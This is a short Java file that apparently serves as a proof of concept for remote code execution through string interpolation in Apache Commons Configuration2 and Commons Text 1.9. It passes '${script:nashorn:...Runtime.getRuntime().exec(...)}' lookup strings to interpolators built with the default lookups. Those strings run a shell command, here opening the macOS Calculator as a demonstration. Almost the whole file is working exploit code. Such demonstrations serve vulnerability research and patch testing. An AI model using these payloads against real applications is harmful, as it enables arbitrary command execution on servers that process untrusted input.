package org.example;

import org.apache.commons.configuration2.interpol.ConfigurationInterpolator;
import org.apache.commons.configuration2.interpol.InterpolatorSpecification;
import org.apache.commons.text.StringSubstitutor;

/**
 * Hello world!
 *
 */
public class App 
{
    public static void main( String[] args )
    {

        InterpolatorSpecification spec =
                new InterpolatorSpecification.Builder()
                    .withPrefixLookups(ConfigurationInterpolator.getDefaultPrefixLookups())
                    .withDefaultLookups(ConfigurationInterpolator.getDefaultPrefixLookups().values())
                    .create();
        ConfigurationInterpolator interpolator = ConfigurationInterpolator.fromSpecification(spec);
        //System.out.println(interpolator.interpolate("${url:utf-8:http://localhost:8888/ping}"));

        interpolator.interpolate("${script:nashorn:java.lang.Runtime.getRuntime().exec('open /System/Applications/Calculator.app')}");
        System.out.println( "Hello World!" );


        // Apache Commons Text 1.9 LCE
        System.out.println("[+] Apache Commons Text "+org.apache.commons.text.StringSubstitutor.class.getPackage().getImplementationVersion());

        System.out.println(StringSubstitutor.createInterpolator().replace("[+] ${java:version} --- ${script:nashorn:java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");}"));
        System.out.println(StringSubstitutor.createInterpolator().replace("${dns:}"));
    }
}
